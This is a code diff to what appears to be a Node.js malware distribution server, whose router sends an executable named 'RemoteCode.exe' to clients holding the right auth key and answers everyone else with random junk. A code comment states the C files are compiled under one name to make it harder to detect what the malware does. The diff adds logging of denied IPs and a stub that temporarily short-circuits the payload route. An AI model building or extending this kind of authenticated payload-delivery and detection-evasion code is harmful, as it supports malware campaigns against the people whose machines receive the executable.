@@ -20,6 +20,7 @@ getReqRouter.get("*", (request, response, next) => {
     {
         // If unauthorized, send a random 64 bit ASCII
         response.status(401);
+        console.log(`🔨 GET request denied for IP ${request.ip} due to invalid auth key '${request.headers.authorization}'.`)
         response.send(genAsciiStr(64));
     }
     else
@@ -30,7 +31,8 @@ getReqRouter.get("*", (request, response, next) => {
 
 // If default URL + authenticated, send appropriate EXE file
 getReqRouter.get("/", (request, response, next) => {
-
+    response.send("Yeah!");
+    return
     // We're going to compile all the C files with the same name to make it harder to detect what our malware does
     const exeName = "RemoteCode.exe";
 
@@ -82,12 +84,13 @@ getReqRouter.get("/", (request, response, next) => {
             }
             else
             {
-                console.log(`EXE file ${exePath} sent to ${request.ip}.`);
+                console.log(`🔨 EXE file ${exePath} sent to ${request.ip}.`);
             }
         });
     }
     else
     {
+        console.log(`🔨 GET request denied for IP ${request.ip} due to invalid EXE file '${request.headers.exe}'.`)
         response.status(401);
         next();
     }
